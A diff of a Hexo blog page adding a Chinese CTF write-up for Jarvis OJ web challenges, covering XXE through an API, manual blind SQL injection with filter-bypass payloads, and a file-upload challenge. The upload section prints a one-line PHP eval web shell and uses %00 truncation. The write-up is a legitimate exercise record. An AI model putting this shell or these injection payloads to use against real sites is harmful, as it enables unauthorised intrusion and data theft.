@@ -24,7 +24,7 @@
 <link rel="shortcut icon" href="/images/favicon.png">
 
 
-<title>Hexo - </title>
+<title>web wp jarvis - Hexo</title>
 
 <meta name="keywords" content>
 
@@ -112,21 +112,9 @@
 
             <div class="page-title">
     <ul>
-        <li class="active">
-            <a href="/" data-name="Recent Posts">Recent Posts</a>
-        </li>
+        <li><a href="/">Recent Posts</a></li>
         
-        <li class>
-            <a href="/categories/tech-notes" data-name="技术">技术</a>
-        </li>
         
-        <li class>
-            <a href="/categories/humanities" data-name="人文">人文</a>
-        </li>
-        
-        <li class>
-            <a href="/categories/others" data-name="其他">其他</a>
-        </li>
         
         <li class="page-search">
     <form id="search" class="search-form">
@@ -138,44 +126,69 @@
     </ul>
 </div>
 <div class="main-inner">
-    
-        
-            
-<article class="post">
-    
-    <div class="post-header">
-        <div class="post-meta">
-            <a href="https://shuoit.net" target="_blank">
-                <strong>纠结伦</strong>
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://shuoit.net" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://shuoit.net" target="_blank">纠结伦</a>
+                    <span title="Last edited at&nbsp;2019-03-29">2019-03-29</span>
+                </p>
+                <p>一个搬🧱的劳斯基😁️️</p>
+            </div>
+            <h2 class="post-title">web wp Jarvis</h2>
+            <div class="post-meta">
+                emm... 887 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>这是关于在JSON中XEE攻击，<a href="https://www.cnblogs.com/blacksunny/p/7891495.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/7891495.html</a><br>用burpsuite抓包，改变content-type为xml，然后添加一下语句：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-1450d89f.PNG" alt></p>
+<h2 id="注意和必须添加。"><a href="#注意和必须添加。" class="headerlink" title="注意和必须添加。"></a>注意<root>和</root>必须添加。</h2><h1 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h1><p>关于SQL注入的题目，采用手工注入的方式<br>1.admin’#  123456 密码错误 用户名为admin<br>2.user’ #  123456 用户名错误<br>3.user’ or 1=1#  123456  用户名错误 过滤了空格或者or<br>4.user’/<strong>/or/</strong>/1=1# 123456 过滤了空格<br>常用过滤方法：<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a><br>采用ascii+基于错误的bool盲注的方法<br>5.admin’/<strong>/or/</strong>/exists(select/<strong>/*/</strong>/from/<strong>/admin)# 123456 密码错误 存在admin<br>6.admin’/</strong>/or/<strong>/exists(select/</strong>/username,password/<strong>/from/</strong>/admin)# 123456 密码错误  存在username，password字段<br>7.admin’/<strong>/or/</strong>/exists(select/<strong>/count(*)/</strong>/from/<strong>/admin)# 123456 存在一条记录<br>8.admin’/</strong>/or/<strong>/(select/</strong>/length(password)/<strong>/from/</strong>/admin)=32# 123456 密码长度32 md5编码<br>注意：select <em> 查询出的是所有的记录<br>     select count(</em>)查询出的是记录的条数</p>
+<p>脚本如下：<br><img src="/2019/03/29/api-调用/api-调用-3811b125.PNG" alt></p>
+<h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>文件上传问题<br> %00截断问题 <a href="https://blog.csdn.net/zpy1998zpy/article/details/805454" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/805454</a><br>首先考虑图片马：</p>
+<script language="php">@eval($_POST['sky']);</script>
+
+<p><img src="/2019/03/29/api-调用/api-调用-931ae5a2.PNG" alt></p>
+<p>结果，出ID：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-b2c556cc.PNG" alt><br>然后观察网站URL，发现文件上传：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-f8e6f5e1.PNG" alt><br>结果发现多了.php：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-418a2893.PNG" alt><br>用%00截断：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-45113939.PNG" alt><br>出结果：</p>
+<p><img src="/2019/03/29/api-调用/api-调用-a65b3bad.PNG" alt></p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
             </a>
-            <em>·</em>2019-03-29
-            
         </div>
-        <a class="post-title" href="/2019/03/29/api-调用/" target="_blank" title="web wp Jarvis">web wp Jarvis</a>
-        <div class="post-meta">
-            <a href="/tags" target="_blank"><i class="fa fa-tags"></i></a>
-            
-                <em>·</em>
-                <a href="http://yoursite.com/tags/ctf-jarvis-OJ-xxe实体注入/" target="_blank">ctf jarvis OJ xxe实体注入</a>
-            
-        </div>
-    </div>
-    <div class="post-desc">
-        web wp Jarvis
-    </div>
-</article>
-
-
-
         
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/ctf-jarvis-OJ-xxe实体注入/">ctf jarvis OJ xxe实体注入</a>
+            
+        </div>
+        
+    </article>
     
+    <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+
+    
+
 </div>
+<script src="/js/busuanzi.pure.mini.js"></script>
 
 
         </div><!-- end #main-->
     </div><!-- end #body -->
     <footer class="footer">
-    <div class="footer-inner" style="text-align: left">
+    <div class="footer-inner" style="text-align: center">
         <p>
             <a href="/about" title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
             <!-- 自定义链接 -->
